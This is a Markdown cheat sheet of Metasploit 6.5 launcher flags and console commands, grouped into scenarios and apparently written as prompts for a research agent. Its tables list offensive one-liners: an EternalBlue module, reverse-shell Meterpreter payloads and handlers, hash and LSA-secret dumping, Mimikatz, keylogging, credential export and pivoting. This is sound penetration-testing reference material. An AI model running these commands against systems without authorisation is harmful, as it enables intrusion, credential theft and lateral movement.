# metasploit — command scenarios for deep research

Every msfconsole launcher flag plus the console command surface, grouped by
scenario. Launcher flags from 6.5.10-dev (`help-msfconsole.txt`); console
commands are the ones documented in the tool README and installed modules.

## How to invoke

```text
@deep-research For Metasploit 6.5, which module for <CVE> is maintained and
actually checks safely, and what are its required options and side effects?
Cite Rapid7 module docs, source, and independent writeups; return module path,
check behavior, and exact console commands.
```

---

## Scenario 1 — launch and environment control

| # | Command | How to use |
|---|---------|------------|
| 1 | `msfconsole` | Normal console with database |
| 2 | `msfconsole -q` | No banner |
| 3 | `msfconsole -n` | Disable database support |
| 4 | `msfconsole -E production` | Set Rails environment |
| 5 | `msfconsole -y db.yaml` | Database settings from YAML |
| 6 | `msfconsole -M /path/migrations` | Extra DB migrations |
| 7 | `msfconsole -c config.rb` | Load a framework config file |
| 8 | `msfconsole -m /path/modules` | Extra module path |
| 9 | `msfconsole --defer-module-loads` | Load modules lazily |
| 10 | `msfconsole --module-count` | Print module counts and exit |
| 11 | `msfconsole -v` | Version |
| 12 | `msfconsole -h` | Launcher help |

**Research questions**
- When does `-n` break features that silently depend on the DB?
- What does `-E` change for module behavior and logging?

**Sources**: Metasploit docs, source `msfconsole`, issues.

**Output**: a launch profile per engagement type.

---

## Scenario 2 — console I/O and automation

| # | Command | How to use |
|---|---------|------------|
| 13 | `msfconsole -r script.rc` | Run a resource script |
| 14 | `msfconsole -r -` | Read resource script from STDIN |
| 15 | `msfconsole -x 'search smb; exit'` | Execute commands, semicolon-separated |
| 16 | `msfconsole -o session.log` | Tee output to a file |
| 17 | `msfconsole -H history.txt` | Custom history file |
| 18 | `msfconsole -l Stdout` | Logger selection |
| 19 | `msfconsole -L` | System Readline |
| 20 | `msfconsole --no-readline` | Disable readline |
| 21 | `msfconsole -p plugin` | Load a plugin at startup |
| 22 | `msfconsole -a` | Ask before exit |
| 23 | `msfconsole -q -x 'db_status; exit'` | Scripted health check |

**Research questions**
- Which logger keeps timestamps and color while still being greppable?
- Resource-script failure semantics: does it stop on error?

**Sources**: resource-script docs, source logger, issues.

**Output**: a reproducible `.rc` workflow with captured output.

---

## Scenario 3 — module discovery and selection

| # | Command | How to use |
|---|---------|------------|
| 24 | `search smb` | Free-text search |
| 25 | `search type:exploit cve:2024` | Filtered search |
| 26 | `search platform:windows type:auxiliary` | Platform/type filters |
| 27 | `use exploit/windows/smb/ms17_010_eternalblue` | Select a module |
| 28 | `info` | Module details and references |
| 29 | `show options` | Required/optional options |
| 30 | `show advanced` | Advanced options |
| 31 | `show payloads` | Compatible payloads |
| 32 | `show targets` | Supported targets |
| 33 | `show missing` | Unset required options |
| 34 | `show encoders` | Encoders |
| 35 | `show nops` | NOP generators |
| 36 | `back` | Deselect module |
| 37 | `previous` | Return to previous module |

**Research questions**
- How to tell a maintained module from an unmaintained one?
- `check` support and reliability per module?

**Sources**: Rapid7 module DB, source, Metasploit Unleashed.

**Output**: a module choice with evidence and required options.

---

## Scenario 4 — option management

| # | Command | How to use |
|---|---------|------------|
| 38 | `set RHOSTS 10.0.0.0/24` | Target range |
| 39 | `set RPORT 445` | Target port |
| 40 | `set LHOST 10.0.0.5` | Callback address |
| 41 | `set LPORT 4444` | Callback port |
| 42 | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` | Payload |
| 43 | `set THREADS 10` | Scanner concurrency |
| 44 | `setg RHOSTS 10.0.0.0/24` | Global option |
| 45 | `setg LogLevel 3` | Global logging |
| 46 | `unset LPORT` | Clear module option |
| 47 | `unsetg RHOSTS` | Clear global option |
| 48 | `save` | Persist global settings |

**Research questions**
- Precedence between `set`, `setg`, and datastore defaults?
- Which options accept files, ranges, or lists?

**Sources**: datastore docs, source option types, issues.

**Output**: an options table checked with `show missing` before running.

---

## Scenario 5 — execution and sessions

| # | Command | How to use |
|---|---------|------------|
| 49 | `check` | Non-exploiting vulnerability check |
| 50 | `run` | Execute module |
| 51 | `exploit` | Execute exploit |
| 52 | `run -j` | Background job |
| 53 | `run -z` | Do not auto-interact |
| 54 | `exploit -k` | Keep handler after session |
| 55 | `jobs` | List jobs |
| 56 | `jobs -k 1` | Kill a job |
| 57 | `sessions -l` | List sessions |
| 58 | `sessions -i 1` | Interact |
| 59 | `sessions -k 1` | Kill |
| 60 | `sessions -u 1` | Upgrade shell to Meterpreter |
| 61 | `sessions -b 1` | Background current session |
| 62 | `sessions -C 'whoami'` | Command on all sessions |
| 63 | `sessions -K` | Kill all sessions |

**Research questions**
- What does `check` actually send, and which modules fake it?
- Session upgrade path for non-Meterpreter shells?

**Sources**: module source `check` methods, docs, issues.

**Output**: an execution ladder that checks before exploiting.

---

## Scenario 6 — database and evidence

| # | Command | How to use |
|---|---------|------------|
| 64 | `db_status` | DB connection status |
| 65 | `workspace` | List workspaces |
| 66 | `workspace -a client` | Add a workspace |
| 67 | `workspace client` | Switch workspace |
| 68 | `db_nmap -sV -p- 10.0.0.5` | Nmap into the DB |
| 69 | `hosts` | Host list |
| 70 | `services` | Service list |
| 71 | `vulns` | Findings |
| 72 | `creds` | Credentials |
| 73 | `loot` | Collected files |
| 74 | `notes` | Notes |
| 75 | `db_import scan.xml` | Import Nmap/Nessus XML |
| 76 | `db_export -f xml out.xml` | Export |
| 77 | `db_export -f pwdump out.txt` | Export credentials |

**Research questions**
- Which evidence artifacts are safe to store, and how are they protected?
- Workspace isolation: can two engagements collide?

**Sources**: DB schema docs, source models, issues.

**Output**: one workspace per engagement and an export at closeout.

---

## Scenario 7 — handlers and payload delivery

| # | Command | How to use |
|---|---------|------------|
| 78 | `use exploit/multi/handler` | Generic handler |
| 79 | `set PAYLOAD linux/x64/meterpreter/reverse_tcp` | Matching payload |
| 80 | `set ExitOnSession false` | Keep handler alive |
| 81 | `exploit -j -z` | Background handler |
| 82 | `set AutoRunScript post/multi/recon/local_exploit_suggester` | Auto post module |
| 83 | `set DisablePayloadHandler true` | Do not start a handler |
| 84 | `set PrependMigrate true` | Migrate on session open |

**Research questions**
- Staged vs stageless handler pairing rules?
- `AutoRunScript` failure behavior?

**Sources**: handler docs, source handler mixin, issues.

**Output**: a handler command matched to the generated payload.

---

## Scenario 8 — Meterpreter and post-exploitation

| # | Command | How to use |
|---|---------|------------|
| 85 | `sysinfo` | Target info |
| 86 | `getuid` | Current user |
| 87 | `getsystem` | Attempt SYSTEM |
| 88 | `ps` | Process list |
| 89 | `migrate 1234` | Migrate process |
| 90 | `ls` / `cd` / `pwd` / `cat` | Filesystem |
| 91 | `download file` / `upload file` | Transfer |
| 92 | `shell` | OS shell |
| 93 | `hashdump` | SAM hashes |
| 94 | `lsa_dump_secrets` | LSA secrets |
| 95 | `kiwi` | Mimikatz |
| 96 | `screenshot` | Screen capture |
| 97 | `keyscan_start` / `keyscan_dump` | Keylogging |
| 98 | `run post/multi/recon/local_exploit_suggester` | Local privesc suggestions |
| 99 | `background` | Background session |
| 100 | `exit` | Close session |

**Research questions**
- Which post actions alter the target and which are read-only?
- Artifacts left by `getsystem`, `migrate`, and `hashdump`?

**Sources**: Meterpreter docs, post module docs, detection writeups.

**Output**: a post-exploitation checklist ordered by intrusiveness.

---

## Scenario 9 — pivoting

| # | Command | How to use |
|---|---------|------------|
| 101 | `route add 10.10.20.0/24 1` | Route via session 1 |
| 102 | `route print` | Show routes |
| 103 | `route flush` | Clear routes |
| 104 | `portfwd add -l 3389 -p 3389 -r 10.10.20.5` | Port forward |
| 105 | `portfwd list` | List forwards |
| 106 | `portfwd flush` | Clear forwards |
| 107 | `use auxiliary/server/socks_proxy` | SOCKS pivot |
| 108 | `set SRVPORT 1080` / `set VERSION 5` | SOCKS config |
| 109 | `run -j` | Start SOCKS in background |
| 110 | `run autoroute -s 10.10.20.0/24` | Meterpreter autoroute |

**Research questions**
- `route` vs `autoroute` lifetime and scope?
- How to verify a pivot without scanning out of scope?

**Sources**: pivoting docs, source route mixin, issues.

**Output**: a pivot diagram with the exact session dependency.

---

## Scenario 10 — console utilities

| # | Command | How to use |
|---|---------|------------|
| 111 | `spool /tmp/msf.log` | Log console output |
| 112 | `makerc script.rc` | Save history as a resource script |
| 113 | `history` | Command history |
| 114 | `load plugin` | Load plugin |
| 115 | `loadpath /path/modules` | Add module path |
| 116 | `irb` | Ruby shell |
| 117 | `connect host 443` | Netcat-like connection |
| 118 | `color false` | Disable color |
| 119 | `exit -y` | Exit without prompt |
| 120 | `msfdb init` / `msfdb status` | DB setup outside console |
| 121 | `msfrpcd -h` | RPC daemon help |

**Research questions**
- `makerc` fidelity — does it capture `set` values with secrets?
- RPC daemon authentication and exposure risk?

**Sources**: console docs, RPC docs, issues.

**Output**: a sanitized `.rc` and a safe logging setup.

---

## Complete flag coverage

| Group | Flags | Scenario |
|-------|-------|----------|
| Launch | `-E`, `-n`, `-y`, `-c`, `-v`/`-V`, `--[no-]defer-module-loads`, `-m`, `-a`, `--module-count`, `-H`, `-l`, `--[no-]readline`, `-L`, `-o`, `-p`, `-q`, `-r`, `-x`, `-h` | 1, 2 |
| DB | `-M`, `-n`, `-y` | 1 |
| Console | `search`, `use`, `info`, `show *`, `back`, `previous`, `set`, `setg`, `unset`, `unsetg`, `save`, `check`, `run`, `exploit`, `jobs`, `sessions` | 3–5 |
| DB commands | `db_status`, `workspace`, `db_nmap`, `hosts`, `services`, `vulns`, `creds`, `loot`, `notes`, `db_import`, `db_export` | 6 |
| Handler | `exploit/multi/handler`, `ExitOnSession`, `AutoRunScript`, `DisablePayloadHandler`, `PrependMigrate` | 7 |
| Post | `sysinfo`, `getuid`, `getsystem`, `ps`, `migrate`, `ls`, `cd`, `pwd`, `cat`, `download`, `upload`, `shell`, `hashdump`, `lsa_dump_secrets`, `kiwi`, `screenshot`, `keyscan_*` | 8 |
| Pivot | `route`, `portfwd`, `socks_proxy`, `autoroute` | 9 |
| Utilities | `spool`, `makerc`, `history`, `load`, `loadpath`, `irb`, `connect`, `color`, `exit`, `msfdb`, `msfrpcd` | 10 |

Full per-flag text: [`help-msfconsole.txt`](help-msfconsole.txt).
